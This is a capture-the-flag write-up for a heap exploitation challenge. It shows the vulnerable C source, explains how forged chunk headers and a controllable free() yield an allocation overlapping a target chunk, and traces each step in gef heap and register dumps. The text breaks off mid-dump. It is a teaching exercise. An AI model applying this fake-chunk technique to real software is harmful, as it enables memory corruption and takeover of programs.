# Solution

There are multiple ways to solve this challenge, this is one of them.

This challenge is different from the previous ones.

## Looking at the Program

So looking at the source code, we see this:

```
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

unsigned int get_uint(void) {
    char buf[20];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return (unsigned int)atoi(buf);
}

void main(void) {
    char *chunk0,
   		 *chunk1,
   		 *target_chunk,
   		 *free_ptr,
   		 *alloc_ptr;

    unsigned long index, allocation_size;

    chunk0 = malloc(0x500);
    target_chunk = malloc(0x100);
    chunk1 = malloc(0x500);

    memset(chunk0, 0x00, 0x500);
    memset(target_chunk, 0x00, 0x100);
    memset(chunk1, 0x00, 0x500);

    printf("Chunk0: %p\n\n", chunk0);
    
    puts("Chunk0 Contents:");
    read(0, chunk0, 0x50);

    puts("Chunk1 Contents:");
    read(0, chunk1, 0x50);

    puts("Index?");
    index = get_uint();

    if ((index < 0) || (index > 0x50)) {
   	 puts("Index is out of range.\n");
   	 return;
    }

    free_ptr = (char *)((unsigned long)chunk0 + index);

    free(free_ptr);

    puts("Size of the chunk allocation?");
    allocation_size = get_uint();

    if ((allocation_size < 1) || (allocation_size > 0x800)) {
   	 puts("Size is out of range.\n");
   	 return;
    }

    alloc_ptr = malloc(allocation_size);

    puts("Allocation Chunk Contents.");
    read(0, alloc_ptr, allocation_size);

    if (*((int *)target_chunk) == 0xdeadbeef) {
   	 puts("You solved the chall!\n");
    }

}
```

At first, we see it will allocate three chunks, and clear them out with `memset`. There are two chunks of size `0x500`, and one chunk of size `0x100` (`0x100` in the middle).

It will then give us the address of `chunk0` (so we have a heap infoleak).

Then, it will allow us to write to the first `0x50` bytes, of the two `0x500` byte chunks.

After that, it will ask us for an offset (`index`) to `chunk0`, and then free that pointer. This index must be between `0` and `0x50`.

After that, it will prompt us for a size (between `1 - 0x800`), and allocate a chunk of that size. It will then allow us to write data to that allocated chunk (size of the write is the same as the allocation size).

Lastly, it will check that the `0x100` byte chunk begins with the `4` byte `0xdeadbeef` value. If it is, we solve the challenge.

# How will we pwn this?

So first off, what is our goal? Our goal is to overwrite the first `4` bytes of `taget_chunk` (that `0x100` byte middle chunk).

We first get to write `0x50` bytes, to the two `0x500` byte chunks. Then we get to free a ptr, that is equal to `chunk0 + x` where `x` is a value between `0x00 - 0x50` that we control.

After that, we can allocate a chunk between `1-0x800` bytes in size, and then write to it equal to the allocation size.

The bug is the free we have control over. Our plan will be, use the two `0x50` byte writes to craft a fake chunk. We will then free that chunk, and reallocate it with malloc. This fake chunk will be designed in a way that it will encompass the value in `target_chunk`, which will allow us to write to it because of the `read(0, alloc_ptr, allocation_size);` call.

So, how will we make the fake chunk? I would like to avoid consolidation here. While we can use it, we don't need to, and preparing the chunk for unlinking will complicate it.

To do this, we will need to prepare three separate chunk headers. The first being the one for the fake chunk, which we will reallocate and have it encompass part of `target_chunk`. The purpose of the second chunk really, is to show with its `PREV_INUSE` flag, that the previous chunk is in use. The purpose of the third chunk is similar. With the third chunk's `PREV_INUSE` flag being set, it will think the second chunk is in use, and will not attempt consolidation.

Before we get into the exact data for the heap chunks, the first chunk is `0x510` bytes (we begin at offset `0x10` because of the chunk header), the second chunk is `0x110` bytes, and the third is `0x510` bytes.

For the first chunk, I put the size as `0x5f0`, and had its offset be at `0x30` bytes from the start of `chunk0`. In order to have the other two chunk headers line up with this chunk, I will need the end of our fake chunk to reach into the `0x50` byte space in `chunk1` we can write to. `0x5f0 + 0x30 = 0x620`, which is exactly the amount we need to reach the beginning of the section we can write to in `chunk1` (`0x500` + `0x110` + `0x10`).

For the next two chunks, I had their `prev_size` be `0x00`, and their sizes be `0x21`. This way, it is clear that the previous chunk is still in use, and I can fit both of the headers in the `0x50` byte space I can write to (although only the second chunk's size is important with that here).

After that, I free our fake chunk, and relocate it. Its user data section begins at `chunk0 + 0x40` (since we placed the chunk header for it at `chunk0 + 0x30`). The value we need to overwrite, is the first `0x04` bytes of the user data section of `target_chunk`, which is `0x510` bytes away from the start of `chunk0`. So the offset from the start of our reallocated fake chunk to the value we need to overwrite, is `0x510 - 0x40 = 0x4d0`.

Let's see this in action:

```
gef➤  x/300g 0x55d952dc5290
0x55d952dc5290:    0x0    0x511
0x55d952dc52a0:    0x0    0x0
0x55d952dc52b0:    0x0    0x0
0x55d952dc52c0:    0x0    0x0
0x55d952dc52d0:    0x0    0x0
0x55d952dc52e0:    0x0    0x0
0x55d952dc52f0:    0x0    0x0
0x55d952dc5300:    0x0    0x0
0x55d952dc5310:    0x0    0x0
0x55d952dc5320:    0x0    0x0
0x55d952dc5330:    0x0    0x0
0x55d952dc5340:    0x0    0x0
0x55d952dc5350:    0x0    0x0
0x55d952dc5360:    0x0    0x0
0x55d952dc5370:    0x0    0x0
0x55d952dc5380:    0x0    0x0
0x55d952dc5390:    0x0    0x0
0x55d952dc53a0:    0x0    0x0
0x55d952dc53b0:    0x0    0x0
0x55d952dc53c0:    0x0    0x0
0x55d952dc53d0:    0x0    0x0
0x55d952dc53e0:    0x0    0x0
0x55d952dc53f0:    0x0    0x0
0x55d952dc5400:    0x0    0x0
0x55d952dc5410:    0x0    0x0
0x55d952dc5420:    0x0    0x0
0x55d952dc5430:    0x0    0x0
0x55d952dc5440:    0x0    0x0
0x55d952dc5450:    0x0    0x0
0x55d952dc5460:    0x0    0x0
0x55d952dc5470:    0x0    0x0
0x55d952dc5480:    0x0    0x0
0x55d952dc5490:    0x0    0x0
0x55d952dc54a0:    0x0    0x0
0x55d952dc54b0:    0x0    0x0
0x55d952dc54c0:    0x0    0x0
0x55d952dc54d0:    0x0    0x0
0x55d952dc54e0:    0x0    0x0
0x55d952dc54f0:    0x0    0x0
0x55d952dc5500:    0x0    0x0
0x55d952dc5510:    0x0    0x0
0x55d952dc5520:    0x0    0x0
0x55d952dc5530:    0x0    0x0
0x55d952dc5540:    0x0    0x0
0x55d952dc5550:    0x0    0x0
0x55d952dc5560:    0x0    0x0
0x55d952dc5570:    0x0    0x0
0x55d952dc5580:    0x0    0x0
0x55d952dc5590:    0x0    0x0
0x55d952dc55a0:    0x0    0x0
0x55d952dc55b0:    0x0    0x0
0x55d952dc55c0:    0x0    0x0
0x55d952dc55d0:    0x0    0x0
0x55d952dc55e0:    0x0    0x0
0x55d952dc55f0:    0x0    0x0
0x55d952dc5600:    0x0    0x0
0x55d952dc5610:    0x0    0x0
0x55d952dc5620:    0x0    0x0
0x55d952dc5630:    0x0    0x0
0x55d952dc5640:    0x0    0x0
0x55d952dc5650:    0x0    0x0
0x55d952dc5660:    0x0    0x0
0x55d952dc5670:    0x0    0x0
0x55d952dc5680:    0x0    0x0
0x55d952dc5690:    0x0    0x0
0x55d952dc56a0:    0x0    0x0
0x55d952dc56b0:    0x0    0x0
0x55d952dc56c0:    0x0    0x0
0x55d952dc56d0:    0x0    0x0
0x55d952dc56e0:    0x0    0x0
0x55d952dc56f0:    0x0    0x0
0x55d952dc5700:    0x0    0x0
0x55d952dc5710:    0x0    0x0
0x55d952dc5720:    0x0    0x0
0x55d952dc5730:    0x0    0x0
0x55d952dc5740:    0x0    0x0
0x55d952dc5750:    0x0    0x0
0x55d952dc5760:    0x0    0x0
0x55d952dc5770:    0x0    0x0
0x55d952dc5780:    0x0    0x0
0x55d952dc5790:    0x0    0x0
0x55d952dc57a0:    0x0    0x111
0x55d952dc57b0:    0x0    0x0
0x55d952dc57c0:    0x0    0x0
0x55d952dc57d0:    0x0    0x0
0x55d952dc57e0:    0x0    0x0
0x55d952dc57f0:    0x0    0x0
0x55d952dc5800:    0x0    0x0
0x55d952dc5810:    0x0    0x0
0x55d952dc5820:    0x0    0x0
0x55d952dc5830:    0x0    0x0
0x55d952dc5840:    0x0    0x0
0x55d952dc5850:    0x0    0x0
0x55d952dc5860:    0x0    0x0
0x55d952dc5870:    0x0    0x0
0x55d952dc5880:    0x0    0x0
0x55d952dc5890:    0x0    0x0
0x55d952dc58a0:    0x0    0x0
0x55d952dc58b0:    0x0    0x511
0x55d952dc58c0:    0x0    0x0
0x55d952dc58d0:    0x0    0x0
0x55d952dc58e0:    0x0    0x0
0x55d952dc58f0:    0x0    0x0
0x55d952dc5900:    0x0    0x0
0x55d952dc5910:    0x0    0x0
0x55d952dc5920:    0x0    0x0
0x55d952dc5930:    0x0    0x0
0x55d952dc5940:    0x0    0x0
0x55d952dc5950:    0x0    0x0
0x55d952dc5960:    0x0    0x0
0x55d952dc5970:    0x0    0x0
0x55d952dc5980:    0x0    0x0
0x55d952dc5990:    0x0    0x0
0x55d952dc59a0:    0x0    0x0
0x55d952dc59b0:    0x0    0x0
0x55d952dc59c0:    0x0    0x0
0x55d952dc59d0:    0x0    0x0
0x55d952dc59e0:    0x0    0x0
0x55d952dc59f0:    0x0    0x0
0x55d952dc5a00:    0x0    0x0
0x55d952dc5a10:    0x0    0x0
0x55d952dc5a20:    0x0    0x0
0x55d952dc5a30:    0x0    0x0
0x55d952dc5a40:    0x0    0x0
0x55d952dc5a50:    0x0    0x0
0x55d952dc5a60:    0x0    0x0
0x55d952dc5a70:    0x0    0x0
0x55d952dc5a80:    0x0    0x0
0x55d952dc5a90:    0x0    0x0
0x55d952dc5aa0:    0x0    0x0
0x55d952dc5ab0:    0x0    0x0
0x55d952dc5ac0:    0x0    0x0
0x55d952dc5ad0:    0x0    0x0
0x55d952dc5ae0:    0x0    0x0
0x55d952dc5af0:    0x0    0x0
0x55d952dc5b00:    0x0    0x0
0x55d952dc5b10:    0x0    0x0
0x55d952dc5b20:    0x0    0x0
0x55d952dc5b30:    0x0    0x0
0x55d952dc5b40:    0x0    0x0
0x55d952dc5b50:    0x0    0x0
0x55d952dc5b60:    0x0    0x0
0x55d952dc5b70:    0x0    0x0
0x55d952dc5b80:    0x0    0x0
0x55d952dc5b90:    0x0    0x0
0x55d952dc5ba0:    0x0    0x0
0x55d952dc5bb0:    0x0    0x0
0x55d952dc5bc0:    0x0    0x0
0x55d952dc5bd0:    0x0    0x0
0x55d952dc5be0:    0x0    0x0
```

So we see here, our three chunks (`0x55d952dc5290/0x55d952dc57a0/0x55d952dc58b0`). Let's see after we have our three fake chunk headers:

```
gef➤  x/300g 0x55d952dc5290
0x55d952dc5290:    0x0    0x511
0x55d952dc52a0:    0x3030303030303030    0x3030303030303030
0x55d952dc52b0:    0x3030303030303030    0x3030303030303030
0x55d952dc52c0:    0x3030303030303030    0x3030303030303030
0x55d952dc52d0:    0x0    0x5f1
0x55d952dc52e0:    0x0    0x0
0x55d952dc52f0:    0x0    0x0
0x55d952dc5300:    0x0    0x0
0x55d952dc5310:    0x0    0x0
0x55d952dc5320:    0x0    0x0
0x55d952dc5330:    0x0    0x0
0x55d952dc5340:    0x0    0x0
0x55d952dc5350:    0x0    0x0
0x55d952dc5360:    0x0    0x0
0x55d952dc5370:    0x0    0x0
0x55d952dc5380:    0x0    0x0
0x55d952dc5390:    0x0    0x0
0x55d952dc53a0:    0x0    0x0
0x55d952dc53b0:    0x0    0x0
0x55d952dc53c0:    0x0    0x0
0x55d952dc53d0:    0x0    0x0
0x55d952dc53e0:    0x0    0x0
0x55d952dc53f0:    0x0    0x0
0x55d952dc5400:    0x0    0x0
0x55d952dc5410:    0x0    0x0
0x55d952dc5420:    0x0    0x0
0x55d952dc5430:    0x0    0x0
0x55d952dc5440:    0x0    0x0
0x55d952dc5450:    0x0    0x0
0x55d952dc5460:    0x0    0x0
0x55d952dc5470:    0x0    0x0
0x55d952dc5480:    0x0    0x0
0x55d952dc5490:    0x0    0x0
0x55d952dc54a0:    0x0    0x0
0x55d952dc54b0:    0x0    0x0
0x55d952dc54c0:    0x0    0x0
0x55d952dc54d0:    0x0    0x0
0x55d952dc54e0:    0x0    0x0
0x55d952dc54f0:    0x0    0x0
0x55d952dc5500:    0x0    0x0
0x55d952dc5510:    0x0    0x0
0x55d952dc5520:    0x0    0x0
0x55d952dc5530:    0x0    0x0
0x55d952dc5540:    0x0    0x0
0x55d952dc5550:    0x0    0x0
0x55d952dc5560:    0x0    0x0
0x55d952dc5570:    0x0    0x0
0x55d952dc5580:    0x0    0x0
0x55d952dc5590:    0x0    0x0
0x55d952dc55a0:    0x0    0x0
0x55d952dc55b0:    0x0    0x0
0x55d952dc55c0:    0x0    0x0
0x55d952dc55d0:    0x0    0x0
0x55d952dc55e0:    0x0    0x0
0x55d952dc55f0:    0x0    0x0
0x55d952dc5600:    0x0    0x0
0x55d952dc5610:    0x0    0x0
0x55d952dc5620:    0x0    0x0
0x55d952dc5630:    0x0    0x0
0x55d952dc5640:    0x0    0x0
0x55d952dc5650:    0x0    0x0
0x55d952dc5660:    0x0    0x0
0x55d952dc5670:    0x0    0x0
0x55d952dc5680:    0x0    0x0
0x55d952dc5690:    0x0    0x0
0x55d952dc56a0:    0x0    0x0
0x55d952dc56b0:    0x0    0x0
0x55d952dc56c0:    0x0    0x0
0x55d952dc56d0:    0x0    0x0
0x55d952dc56e0:    0x0    0x0
0x55d952dc56f0:    0x0    0x0
0x55d952dc5700:    0x0    0x0
0x55d952dc5710:    0x0    0x0
0x55d952dc5720:    0x0    0x0
0x55d952dc5730:    0x0    0x0
0x55d952dc5740:    0x0    0x0
0x55d952dc5750:    0x0    0x0
0x55d952dc5760:    0x0    0x0
0x55d952dc5770:    0x0    0x0
0x55d952dc5780:    0x0    0x0
0x55d952dc5790:    0x0    0x0
0x55d952dc57a0:    0x0    0x111
0x55d952dc57b0:    0x0    0x0
0x55d952dc57c0:    0x0    0x0
0x55d952dc57d0:    0x0    0x0
0x55d952dc57e0:    0x0    0x0
0x55d952dc57f0:    0x0    0x0
0x55d952dc5800:    0x0    0x0
0x55d952dc5810:    0x0    0x0
0x55d952dc5820:    0x0    0x0
0x55d952dc5830:    0x0    0x0
0x55d952dc5840:    0x0    0x0
0x55d952dc5850:    0x0    0x0
0x55d952dc5860:    0x0    0x0
0x55d952dc5870:    0x0    0x0
0x55d952dc5880:    0x0    0x0
0x55d952dc5890:    0x0    0x0
0x55d952dc58a0:    0x0    0x0
0x55d952dc58b0:    0x0    0x511
0x55d952dc58c0:    0x0    0x21
0x55d952dc58d0:    0x0    0x0
0x55d952dc58e0:    0x0    0x21
0x55d952dc58f0:    0x0    0x0
0x55d952dc5900:    0x0    0x0
0x55d952dc5910:    0x0    0x0
0x55d952dc5920:    0x0    0x0
0x55d952dc5930:    0x0    0x0
0x55d952dc5940:    0x0    0x0
0x55d952dc5950:    0x0    0x0
0x55d952dc5960:    0x0    0x0
0x55d952dc5970:    0x0    0x0
0x55d952dc5980:    0x0    0x0
0x55d952dc5990:    0x0    0x0
0x55d952dc59a0:    0x0    0x0
0x55d952dc59b0:    0x0    0x0
0x55d952dc59c0:    0x0    0x0
0x55d952dc59d0:    0x0    0x0
0x55d952dc59e0:    0x0    0x0
0x55d952dc59f0:    0x0    0x0
0x55d952dc5a00:    0x0    0x0
0x55d952dc5a10:    0x0    0x0
0x55d952dc5a20:    0x0    0x0
0x55d952dc5a30:    0x0    0x0
0x55d952dc5a40:    0x0    0x0
0x55d952dc5a50:    0x0    0x0
0x55d952dc5a60:    0x0    0x0
0x55d952dc5a70:    0x0    0x0
0x55d952dc5a80:    0x0    0x0
0x55d952dc5a90:    0x0    0x0
0x55d952dc5aa0:    0x0    0x0
0x55d952dc5ab0:    0x0    0x0
0x55d952dc5ac0:    0x0    0x0
0x55d952dc5ad0:    0x0    0x0
0x55d952dc5ae0:    0x0    0x0
0x55d952dc5af0:    0x0    0x0
0x55d952dc5b00:    0x0    0x0
0x55d952dc5b10:    0x0    0x0
0x55d952dc5b20:    0x0    0x0
0x55d952dc5b30:    0x0    0x0
0x55d952dc5b40:    0x0    0x0
0x55d952dc5b50:    0x0    0x0
0x55d952dc5b60:    0x0    0x0
0x55d952dc5b70:    0x0    0x0
0x55d952dc5b80:    0x0    0x0
0x55d952dc5b90:    0x0    0x0
0x55d952dc5ba0:    0x0    0x0
0x55d952dc5bb0:    0x0    0x0
0x55d952dc5bc0:    0x0    0x0
0x55d952dc5bd0:    0x0    0x0
0x55d952dc5be0:    0x0    0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f54f322cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f54f322cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
```

So we can see our three fake chunk headers at `0x55d952dc52d0/0x55d952dc58c0/0x55d952dc58e0`. The `0x55d952dc52d0` chunk is `0x5f0` bytes, which we see lines up with the second chunk (`0x55d952dc52d0+0x5f0=0x55d952dc58c0`), and we sees the second chunk lines up with the third (`0x55d952dc58c0+0x20=0x55d952dc58e0`). We see for all three chunks, we have `prev_size` set to `0x0`, and the `PREV_INUSE` flag set to `0x1`:

```
Breakpoint 4, 0x000055d9524963d5 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055d952dc52e0  →  0x0000000000000000
$rbx   : 0x0          	 
$rcx   : 0x00007ffd1a01b842  →  0xb8b000000000000a ("\n"?)
$rdx   : 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x40         	 
$rdi   : 0x000055d952dc52e0  →  0x0000000000000000
$rip   : 0x000055d9524963d5  →  <main+296> call 0x55d9524960d0 <free@plt>
$r8	: 0x1999999999999999
$r9	: 0x0          	 
$r10   : 0x00007f54f3173ac0  →  0x0000000100000000
$r11   : 0x00007f54f31743c0  →  0x0002000200020002
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x0000000000000000
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x0000000000000000
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  0x0000000000000000
0x00007ffd1a01b8a0│+0x0030: 0x0000000000000000
0x00007ffd1a01b8a8│+0x0038: 0x00007f54f334f080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d9524963ca <main+285>   	mov	QWORD PTR [rbp-0x18], rax
   0x55d9524963ce <main+289>   	mov	rax, QWORD PTR [rbp-0x18]
   0x55d9524963d2 <main+293>   	mov	rdi, rax
 → 0x55d9524963d5 <main+296>   	call   0x55d9524960d0 <free@plt>
   ↳  0x55d9524960d0 <free@plt+0> 	endbr64
  	0x55d9524960d4 <free@plt+4> 	bnd	jmp QWORD PTR [rip+0x2eb5]    	# 0x55d952498f90 <free@got.plt>
  	0x55d9524960db <free@plt+11>	nop	DWORD PTR [rax+rax*1+0x0]
  	0x55d9524960e0 <puts@plt+0> 	endbr64
  	0x55d9524960e4 <puts@plt+4> 	bnd	jmp QWORD PTR [rip+0x2ead]    	# 0x55d952498f98 <puts@got.plt>
  	0x55d9524960eb <puts@plt+11>	nop	DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
free@plt (
   $rdi = 0x000055d952dc52e0 → 0x0000000000000000
)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d9524963d5 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d9524963d5 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rdi
$1 = 0x55d952dc52e0
gef➤  si
0x000055d9524960d0 in free@plt ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x000055d952dc52e0  →  0x0000000000000000
$rbx   : 0x0          	 
$rcx   : 0x00007ffd1a01b842  →  0xb8b000000000000a ("\n"?)
$rdx   : 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
$rsp   : 0x00007ffd1a01b868  →  0x000055d9524963da  →  <main+301> lea rax, [rip+0xc72]    	# 0x55d952497053
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x40         	 
$rdi   : 0x000055d952dc52e0  →  0x0000000000000000
$rip   : 0x000055d9524960d0  →  <free@plt+0> endbr64
$r8	: 0x1999999999999999
$r9	: 0x0          	 
$r10   : 0x00007f54f3173ac0  →  0x0000000100000000
$r11   : 0x00007f54f31743c0  →  0x0002000200020002
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b868│+0x0000: 0x000055d9524963da  →  <main+301> lea rax, [rip+0xc72]    	# 0x55d952497053     ← $rsp
0x00007ffd1a01b870│+0x0008: 0x0000000000000000
0x00007ffd1a01b878│+0x0010: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0018: 0x000055d952dc57b0  →  0x0000000000000000
0x00007ffd1a01b888│+0x0020: 0x000055d952dc58c0  →  0x0000000000000000
0x00007ffd1a01b890│+0x0028: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0030: 0x000055d952dc52e0  →  0x0000000000000000
0x00007ffd1a01b8a0│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d9524960c0 <__cxa_finalize@plt+0> endbr64
   0x55d9524960c4 <__cxa_finalize@plt+4> bnd	jmp QWORD PTR [rip+0x2f2d]    	# 0x55d952498ff8
   0x55d9524960cb <__cxa_finalize@plt+11> nop	DWORD PTR [rax+rax*1+0x0]
 → 0x55d9524960d0 <free@plt+0> 	endbr64
   0x55d9524960d4 <free@plt+4> 	bnd	jmp QWORD PTR [rip+0x2eb5]    	# 0x55d952498f90 <free@got.plt>
   0x55d9524960db <free@plt+11>	nop	DWORD PTR [rax+rax*1+0x0]
   0x55d9524960e0 <puts@plt+0> 	endbr64
   0x55d9524960e4 <puts@plt+4> 	bnd	jmp QWORD PTR [rip+0x2ead]    	# 0x55d952498f98 <puts@got.plt>
   0x55d9524960eb <puts@plt+11>	nop	DWORD PTR [rax+rax*1+0x0]
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d9524960d0 in free@plt (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d9524960d0 → free@plt()
[#1] 0x55d9524963da → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  finish
Run till exit from #0  0x000055d9524960d0 in free@plt ()

Breakpoint 3, 0x000055d9524963da in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1          	 
$rbx   : 0x0          	 
$rcx   : 0x5d         	 
$rdx   : 0x00007f54f322cd00  →  0x000055d952dc71e0  →  0x0000000000000000
$rsp   : 0x00007ffd1a01b870  →  0x0000000000000000
$rbp   : 0x00007ffd1a01b8b0  →  0x0000000000000001
$rsi   : 0x0          	 
$rdi   : 0x00007f54f322cca0  →  0x0000000000000000
$rip   : 0x000055d9524963da  →  <main+301> lea rax, [rip+0xc72]    	# 0x55d952497053
$r8	: 0x1999999999999999
$r9	: 0x0          	 
$r10   : 0x00007f54f3173ac0  →  0x0000000100000000
$r11   : 0x00007f54f31743c0  →  0x0002000200020002
$r12   : 0x00007ffd1a01b9c8  →  0x00007ffd1a01c486  →  "./chall-04"
$r13   : 0x000055d9524962ad  →  <main+0> endbr64
$r14   : 0x000055d952498d70  →  0x000055d952496200  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f54f3367020  →  0x00007f54f33682e0  →  0x000055d952495000  →   jg 0x55d952495047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd1a01b870│+0x0000: 0x0000000000000000     ← $rsp
0x00007ffd1a01b878│+0x0008: 0x000055d952dc52a0  →  "000000000000000000000000000000000000000000000000"
0x00007ffd1a01b880│+0x0010: 0x000055d952dc57b0  →  0x0000000000000000
0x00007ffd1a01b888│+0x0018: 0x000055d952dc58c0  →  0x00000000000005f0
0x00007ffd1a01b890│+0x0020: 0x0000000000000040 ("@"?)
0x00007ffd1a01b898│+0x0028: 0x000055d952dc52e0  →  0x00007f54f322cd00  →  0x000055d952dc71e0  →  0x0000000000000000
0x00007ffd1a01b8a0│+0x0030: 0x0000000000000000
0x00007ffd1a01b8a8│+0x0038: 0x00007f54f334f080  →  <dl_main+0> endbr64
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55d9524963ce <main+289>   	mov	rax, QWORD PTR [rbp-0x18]
   0x55d9524963d2 <main+293>   	mov	rdi, rax
   0x55d9524963d5 <main+296>   	call   0x55d9524960d0 <free@plt>
 → 0x55d9524963da <main+301>   	lea	rax, [rip+0xc72]    	# 0x55d952497053
   0x55d9524963e1 <main+308>   	mov	rdi, rax
   0x55d9524963e4 <main+311>   	call   0x55d9524960e0 <puts@plt>
   0x55d9524963e9 <main+316>   	call   0x55d952496249 <get_uint>
   0x55d9524963ee <main+321>   	mov	eax, eax
   0x55d9524963f0 <main+323>   	mov	QWORD PTR [rbp-0x10], rax
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-04", stopped 0x55d9524963da in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55d9524963da → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f54f322cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f54f322cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55d952dc52d0, bk=0x55d952dc52d0
 →   Chunk(addr=0x55d952dc52e0, size=0x5f0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f54f322cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/20g 0x55d952dc52d0
0x55d952dc52d0:    0x0    0x5f1
0x55d952dc52e0:    0x7f54f322cd00    0x7f54f322cd00
0x55d952dc52f0:    0x0    0x0
0x55d952dc5300:    0x0    0x0
0x55d952dc5310:    0x0    0x0
0x55d952dc5320:    0x0    0x0
0x55d952dc5330:    0x0    0x0
0x55d952dc5340:    0x0    0x0
0x55d952dc5350:    0x0    0x0
0x55d952dc5360:    0x0    0x0
```

So we see, we free a chunk that it's chunk header begins at offset `0x30` from `chunk0` (the ptr we pass to `free` is to the user data section, so it's `0x40` bytes away from the start of `chunk0` (`0x55d952dc52e0 - 0x55d952dc52a0 = 0x40`)). We see that our fake chunk successfully gets inserted into the unsorted bin, of size `0x5f0`. The end of our fake chunk is at `0x55d952dc52d0 + 0x5f0 = 0x55d952dc58c0`, which is past the start of the value in the target chunk we need to overwrite at `0x55d952dc57b0`.

Let's relocate our fake chunk:

```
Breakpoint 5, 0x000055d952496422 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
